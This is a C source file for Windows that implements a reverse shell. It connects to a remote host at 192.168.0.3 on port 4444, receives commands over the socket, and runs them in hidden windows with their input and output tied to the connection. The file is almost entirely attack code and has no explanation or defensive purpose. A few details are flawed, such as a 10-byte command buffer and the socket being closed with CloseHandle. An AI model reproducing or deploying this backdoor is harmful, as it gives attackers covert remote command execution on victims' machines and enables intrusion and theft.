#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>

#define SERVER_IP "192.168.0.3"
#define SERVER_PORT 4444

void main() {
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Failed to initialize Winsock");
        return;
    }

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        perror("Failed to create socket");
        WSACleanup();
        return;
    }

    // Set up server address structure
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Failed to connect to the server");
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    printf("[+] Connected to the remote server.\n");

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmd[10];

    while (1) {
        memset(cmd, '\0', sizeof(cmd));

        recv(clientSocket, cmd, sizeof(cmd), 0);

        if (!strncmp(cmd, "q", sizeof(cmd))) {
            break;
        } else {
            ZeroMemory(&si, sizeof(si));
            ZeroMemory(&pi, sizeof(pi));

            si.cb = sizeof(si);
            si.dwFlags |= STARTF_USESTDHANDLES;
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)clientSocket;

            int result = CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            if (!result) {
                perror("Failed to execute command");
            }
        }
    }

    CloseHandle(clientSocket);
    WSACleanup();
}